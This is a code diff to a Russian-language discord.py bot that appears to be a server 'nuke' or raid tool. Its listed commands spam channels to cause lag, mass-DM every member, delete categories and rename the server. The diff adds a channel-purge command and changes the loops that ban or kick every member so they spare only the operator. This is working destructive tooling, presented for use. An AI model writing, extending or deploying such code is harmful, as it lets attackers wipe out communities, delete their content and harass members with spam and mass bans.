@@ -43,6 +43,7 @@ class MyClient(discord.Client):
 			embed.add_field(name='*категории', value='Удалить только категории', inline=False)
 			embed.add_field(name='*лаги', value='Чудовищный спам, вызывает лаги', inline=False)
 			embed.add_field(name='*лс', value='Рассылка всем участникам в ЛС', inline=False)
+			embed.add_field(name='*очистить', value='Очистить чат', inline=False)
 			embed.add_field(name='*переименовать', value='Перименовать сервер', inline=False)
 			embed.add_field(name='*разблок', value='Разблокировать текущий канал (разрешить всем отправлять сообщения)', inline=False)
 			embed.add_field(name='*разблоквезде', value='Разблокировать все каналы (разрешить всем отправлять сообщения)', inline=False)
@@ -190,8 +191,9 @@ class MyClient(discord.Client):
 				for i in message.guild.members:
 					await asyncio.sleep(0.1)
 					try:
-						await i.ban() #бан всех участников
-						m = m + 1
+						if i != message.author:
+							await i.ban() #бан всех участников
+							m = m + 1
 					except:
 						pass
 				await message.author.send('**:hammer: Участников забанено: **' + str(m))
@@ -225,8 +227,9 @@ class MyClient(discord.Client):
 				for i in message.guild.members:
 					await asyncio.sleep(0.1)
 					try:
-						await i.ban() #бан
-						m = m + 1
+						if i != message.author:
+							await i.ban() #бан
+							m = m + 1
 					except:
 						pass
 				cdn = 0
@@ -238,8 +241,9 @@ class MyClient(discord.Client):
 				for i in message.guild.members:
 					await asyncio.sleep(0.1)
 					try:
-						await i.kick() #кик
-						m = m + 1
+						if i != message.author:
+							await i.kick() #кик
+							m = m + 1
 					except:
 						pass
 				cdn = 0
@@ -454,6 +458,10 @@ class MyClient(discord.Client):
 				for i in message.guild.text_channels:
 					await i.set_permissions(message.guild.default_role, send_messages=True)
 				await message.author.send(':white_check_mark:')
+				
+			if message.content == '*очистить' and not message.author.bot:
+				await message.delete()
+				await message.channel.purge()
 					
 					
 			if vips.find(str(message.author.id)) != -1 and not message.author.bot:
